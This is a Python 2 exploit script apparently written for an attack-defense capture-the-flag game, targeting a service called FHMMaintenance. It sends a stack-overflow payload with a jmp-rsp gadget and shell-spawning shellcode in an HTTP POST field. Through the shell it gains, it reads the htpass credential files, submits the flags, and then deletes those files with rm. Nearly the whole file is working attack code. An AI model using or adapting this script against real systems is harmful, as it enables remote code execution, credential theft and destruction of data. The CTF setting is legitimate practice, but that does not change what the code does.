#!/usr/bin/env python2

import socket
from lxml import html
import requests
import sys
import os
import random
import string
import time
from struct import pack
from pwn import asm, context, shellcraft
from hashlib import sha1
from base64 import urlsafe_b64encode as b64enc

sys.path.append('./utilities/')
from utils import sendFlag
from utils import getFlagID

_USER_ = ''.join(random.choice(string.ascii_letters) for i in range(32))
_PASS_ = ''.join(random.choice(string.ascii_letters) for i in range(32))
    
def submitFlags(f, flag_id):
    c = f.splitlines()
    for i in c:
        if flag_id in i:
            print('FLAG ID: ' + str(flag_id))
            flag = c[c.index(i)+1]
            #flag = c[c.index(i)]
            if ("FLG_" in flag):
                print('Flag: ' + str(flag))
                flag = flag.replace('FLG_','')[:20]
                print('Try to send flag: ' + str(flag))
                print(sendFlag(flag, 'FHMMaintenance'))
    return

def readfile(path, dst='rdi'):
    """this function comes from pwntools itself"""
    craft = shellcraft.amd64

    ret = craft.mov('r8', dst)
    ret += craft.pushstr(path)
    ret += craft.syscall('SYS_open', 'rsp', 'O_RDONLY')
    ret += craft.mov('rbx', 'rax')
    ret += craft.syscall('SYS_fstat', 'rax', 'rsp')
    ret += 'add rsp, 48\n'
    ret += 'mov rdx, [rsp]\n'
    ret += craft.syscall('SYS_sendfile', 'r8', 'rbx', 0, 'rdx')
    return ret

def get_payload():
    # Create the payload
    context.arch = 'amd64'
    craft = shellcraft.amd64

    rop = pack('<Q', 0x00000000004027d9)   # jmp rsp ; ret
    shellcode = craft.linux.sh()

    rop += asm(shellcode)

    for c in ['&', '\r', '\n']:
        if c in rop:
            print "Found %x in the shellcode" % ord(c)
            sys.exit(2)

    payload = "POST /test HTTP/1.0\r\n\r\nusername=%s&secret=%s&pass=%s\r\n"% \
            (_USER_, "A"*0xb8 + rop, _PASS_)
    return payload

def runCmd(ip, port, command):
    payload = get_payload()

    # Send the payload
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((ip, port))

    sock.settimeout(0.3)
    sock.sendall(payload)
    time.sleep(0.1)

    # Exploit the result: shell
    buf = ''
    #while buf != 'exit':
    buf = buf + command
    sock.sendall("%s\n" % buf)
    sock.setblocking(False)    
    time.sleep(0.1)

    try:
        f=sock.recv(8192)
        #print(f)
        submitFlags(f, flag_id)
        #buf=""
        #time.sleep(10)    
    except(KeyboardInterrupt):
        exit(1)
    except:
        pass

def exploit(ip, port, flag_id):
    payload = get_payload()

    # Send the payload
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((ip, port))

    sock.settimeout(0.3)
    sock.sendall(payload)
    time.sleep(0.1)

    # Exploit the result: shell
    buf = ''
    #while buf != 'exit':
    buf = buf + "cat /opt/ctf/FHM-Maintenance/rw/doc_root/htpass/*"
    sock.sendall("%s\n" % buf)
    sock.setblocking(False)    
    time.sleep(0.1)

    try:
        f=sock.recv(8192)
        #print(f)
        submitFlags(f, flag_id)
        runCmd(ip, port, "rm /opt/ctf/FHM-Maintenance/rw/doc_root/htpass/*")
        f.close()
        sys.exit(1)
        #buf=""
        #time.sleep(10)    
    except(KeyboardInterrupt):
        exit(1)
    except:
        pass


if __name__ == '__main__':
    # parse options
    if len(sys.argv) < 2:
        print "Usage: %s <ip>" % os.path.basename(__file__)
        sys.exit(1)
    else:
        ip = sys.argv[1]
        port = 20111
        exploit(ip, port, getFlagID('FHMMaintenance'))